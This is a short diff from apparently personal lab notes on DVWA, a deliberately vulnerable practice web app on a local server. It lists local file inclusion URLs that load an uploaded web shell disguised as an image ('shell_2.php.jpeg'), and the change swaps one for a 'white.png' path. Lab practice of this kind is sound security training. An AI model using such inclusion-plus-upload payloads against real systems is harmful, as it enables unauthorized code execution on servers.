@@ -10,4 +10,4 @@ C:/xampp/htdocs/dvwa/hackable/uploads/shell_2.php.jpeg
 
 http://192.168.0.105/dvwa/vulnerabilities/fi/?page=file://C:/xampp/htdocs/dvwa/hackable/uploads/shell_2.php.jpeg
 
-http://192.168.0.105/dvwa/vulnerabilities/fi/?page=file://C:/xampp/htdocs/dvwa/hackable/uploads/shell_2.php.jpeg
+http://192.168.0.105/dvwa/vulnerabilities/fi/?page=file://C:/xampp/htdocs/dvwa/hackable/uploads/white.png
